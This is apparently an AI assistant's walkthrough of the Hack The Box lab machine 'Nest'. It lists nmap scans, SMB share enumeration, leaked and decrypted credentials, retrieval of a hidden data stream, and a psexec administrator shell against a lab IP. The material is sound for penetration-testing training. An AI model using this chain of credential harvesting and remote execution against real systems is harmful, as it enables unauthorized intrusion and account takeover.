Nice work on completing HTB: Nest! 🔥 Here's a full walkthrough with commands grouped by phase, as you like:

---

## 🧭 Reconnaissance

**Nmap Full TCP Port Scan**
```bash
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.178
```

**Nmap Service/Script Scan**
```bash
nmap -p 445,4386 -sC -sV -oA scripts/nmap-tcpscripts 10.10.10.178
```

**Key Ports Identified**
- TCP 445: SMB
- TCP 4386: HQK Reporting Service (custom)

---

## 📁 Initial [SMB](SMB.md) Enumeration

**Anonymous SMB Access**
```bash
smbmap -H 10.10.10.178 -u null
smbclient -N //10.10.10.178/Users
smbclient -N //10.10.10.178/Data
```

**Files of Interest**
- `Welcome Email.txt` → Provided creds: `TempUser : welcome2019`

---

## 🔑 Gaining Access as TempUser

**Enumerate Shares With Credentials**
```bash
smbmap -H 10.10.10.178 -u TempUser -p welcome2019
smbclient -U TempUser //10.10.10.178/Data
```

**Pull Files**
```bash
recurse ON
prompt OFF
mget *
```

**Find Encrypted Password**
- In `RU_config.xml` for user `c.smith`
- Password: `fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=`

**Find Path Hint**
- In `Notepad++` config file → referenced: `\\HTB-NEST\Secure$\IT\Carl`

---

## 🔓 Decrypting C.Smith's Password

**Locate Visual Basic Project**
```bash
smbclient -U TempUser //10.10.10.178/Secure$
cd "IT\Carl"
recurse ON
prompt OFF
mget *
```

**Decrypt Password via DotNetFiddle**
```vbnet
DecryptString("fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=")
```
- Result: `xRxRxPANCAK3SxRxRx`

---

## 🧑‍💻 Shell as C.Smith

**Verify SMB Access**
```bash
smbmap -H 10.10.10.178 -u C.Smith -p xRxRxPANCAK3SxRxRx
```

**Retrieve user.txt**
```bash
smbclient -U C.Smith //10.10.10.178/Users
cd C.Smith
get user.txt
```

---

## 🧠 Debug Access to HQK Reporting Service

**Manual Connect With Telnet**
```bash
telnet 10.10.10.178 4386
```

**Find Hidden Stream in SMB**
```bash
smbclient -U C.Smith //10.10.10.178/Users
cd "HQK Reporting"
allinfo "Debug Mode Password.txt"
get "Debug Mode Password.txt:Password"
```
- Result: `WBQ201953D8w`

**Enable Debug Mode in HQK**
```bash
debug WBQ201953D8w
```

**Show LDAP Config with Encrypted Admin Password**
```bash
setdir LDAP
showquery 2
```

---

## 🔓 Decrypting Admin Password

**Grab and Open HqkLdap.exe in dnSpy**
- Find decryption logic
- Run with breakpoint or patched console output

**Resulting Password**
- `XtH4nkS4Pl4y1nGX`

---

## 👑 Shell as SYSTEM

**PSExec Shell**
```bash
psexec.py administrator:XtH4nkS4Pl4y1nGX@10.10.10.178
```

**Grab root.txt**
```bash
type C:\Users\Administrator\Desktop\root.txt
```